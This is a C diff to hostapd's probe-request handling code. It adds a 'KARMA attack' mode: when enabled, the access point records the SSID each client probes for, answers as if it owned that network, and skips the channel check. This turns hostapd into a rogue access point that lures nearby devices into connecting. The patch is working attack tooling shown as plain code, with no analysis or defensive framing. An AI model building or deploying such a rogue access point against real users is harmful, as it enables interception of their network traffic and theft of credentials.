@@ -416,9 +416,24 @@ static u8 * hostapd_gen_probe_resp(struct hostapd_data *hapd,
 
 	pos = resp->u.probe_resp.variable;
 	*pos++ = WLAN_EID_SSID;
-	*pos++ = hapd->conf->ssid.ssid_len;
-	os_memcpy(pos, hapd->conf->ssid.ssid, hapd->conf->ssid.ssid_len);
+#ifdef CONFIG_KARMA_ATTACK
+    if (hapd->conf->karma_enable) {
+	    *pos++ = hapd->karma_data.ssid_len;
+	    os_memcpy(
+            pos, hapd->karma_data.ssid, hapd->karma_data.ssid_len);
+	    pos += hapd->karma_data.ssid_len;
+    } else {
+        *pos++ = hapd->conf->ssid.ssid_len;
+        os_memcpy(
+            pos, hapd->conf->ssid.ssid, hapd->conf->ssid.ssid_len);
+	    pos += hapd->conf->ssid.ssid_len;
+    
+    }
+#else
+    *pos++ = hapd->conf->ssid.ssid_len;
+    os_memcpy(pos, hapd->conf->ssid.ssid, hapd->conf->ssid.ssid_len);
 	pos += hapd->conf->ssid.ssid_len;
+#endif
 
 	/* Supported rates */
 	pos = hostapd_eid_supp_rates(hapd, pos);
@@ -551,7 +566,11 @@ static enum ssid_match_result ssid_match(struct hostapd_data *hapd,
 {
 	const u8 *pos, *end;
 	int wildcard = 0;
-
+#ifdef CONFIG_KARMA_ATTACK
+    if (hapd->conf->karma_enable) {
+        return EXACT_SSID_MATCH;
+    }
+#endif
 	if (ssid_len == 0)
 		wildcard = 1;
 	if (ssid_len == hapd->conf->ssid.ssid_len &&
@@ -720,7 +739,6 @@ void handle_probe_req(struct hostapd_data *hapd,
 					    mgmt->sa, mgmt->da, mgmt->bssid,
 					    ie, ie_len, ssi_signal) > 0)
 			return;
-
 	if (!hapd->iconf->send_probe_response)
 		return;
 
@@ -746,17 +764,21 @@ void handle_probe_req(struct hostapd_data *hapd,
 	 * number of unnecessary Probe Response frames for cases where the STA
 	 * is less likely to see them (Probe Request frame sent on a
 	 * neighboring, but partially overlapping, channel).
-	 */
-	if (elems.ds_params &&
-	    hapd->iface->current_mode &&
-	    (hapd->iface->current_mode->mode == HOSTAPD_MODE_IEEE80211G ||
-	     hapd->iface->current_mode->mode == HOSTAPD_MODE_IEEE80211B) &&
-	    hapd->iconf->channel != elems.ds_params[0]) {
-		wpa_printf(MSG_DEBUG,
-			   "Ignore Probe Request due to DS Params mismatch: chan=%u != ds.chan=%u",
-			   hapd->iconf->channel, elems.ds_params[0]);
-		return;
-	}
+	 * ..note when KARMA attack is enable we do not check the channel of probe REQ
+     * is same as the launched AP
+     */
+#ifdef CONFIG_KARMA_ATTACK
+    if (!hapd->conf->karma_enable)
+#endif
+    {
+	    if (elems.ds_params &&
+	        hapd->iface->current_mode &&
+	        (hapd->iface->current_mode->mode == HOSTAPD_MODE_IEEE80211G ||
+	         hapd->iface->current_mode->mode == HOSTAPD_MODE_IEEE80211B) &&
+	        hapd->iconf->channel != elems.ds_params[0]) {
+	    	return;
+	    }
+    }
 
 #ifdef CONFIG_P2P
 	if (hapd->p2p && hapd->p2p_group && elems.wps_ie) {
@@ -817,19 +839,30 @@ void handle_probe_req(struct hostapd_data *hapd,
 	}
 #endif /* CONFIG_TAXONOMY */
 
+    
 	res = ssid_match(hapd, elems.ssid, elems.ssid_len,
-			 elems.ssid_list, elems.ssid_list_len);
+	    		 elems.ssid_list, elems.ssid_list_len);
+
 	if (res == NO_SSID_MATCH) {
-		if (!(mgmt->da[0] & 0x01)) {
-			wpa_printf(MSG_MSGDUMP, "Probe Request from " MACSTR
-				   " for foreign SSID '%s' (DA " MACSTR ")%s",
-				   MAC2STR(mgmt->sa),
-				   wpa_ssid_txt(elems.ssid, elems.ssid_len),
-				   MAC2STR(mgmt->da),
-				   elems.ssid_list ? " (SSID list)" : "");
-		}
-		return;
-	}
+	    if (!(mgmt->da[0] & 0x01)) {
+	    	wpa_printf(MSG_MSGDUMP,
+                    "Probe Request from " MACSTR
+	    		    " for foreign SSID '%s' (DA " MACSTR ")%s",
+	    		    MAC2STR(mgmt->sa),
+                    wpa_ssid_txt(elems.ssid, elems.ssid_len),
+                    MAC2STR(mgmt->da),
+                    elems.ssid_list ? " (SSID list)" : "");
+        }
+        return;
+    }
+    
+#ifdef CONFIG_KARMA_ATTACK
+    if (hapd->conf->karma_enable) {
+	    os_memcpy(
+            hapd->karma_data.ssid, elems.ssid, elems.ssid_len);
+        hapd->karma_data.ssid_len = elems.ssid_len;
+    }
+#endif
 
 #ifdef CONFIG_INTERWORKING
 	if (hapd->conf->interworking &&
@@ -911,8 +944,9 @@ void handle_probe_req(struct hostapd_data *hapd,
 
 	resp = hostapd_gen_probe_resp(hapd, mgmt, elems.p2p != NULL,
 				      &resp_len);
-	if (resp == NULL)
+	if (resp == NULL) {
 		return;
+    }
 
 	/*
 	 * If this is a broadcast probe request, apply no ack policy to avoid
@@ -931,10 +965,9 @@ void handle_probe_req(struct hostapd_data *hapd,
 			csa_offs[csa_offs_len++] =
 				hapd->cs_c_off_ecsa_proberesp;
 	}
-
-	ret = hostapd_drv_send_mlme_csa(hapd, resp, resp_len, noack,
-					csa_offs_len ? csa_offs : NULL,
-					csa_offs_len);
+    ret = hostapd_drv_send_mlme_csa(hapd, resp, resp_len, noack,
+				csa_offs_len ? csa_offs : NULL,
+				csa_offs_len);
 
 	if (ret < 0)
 		wpa_printf(MSG_INFO, "handle_probe_req: send failed");
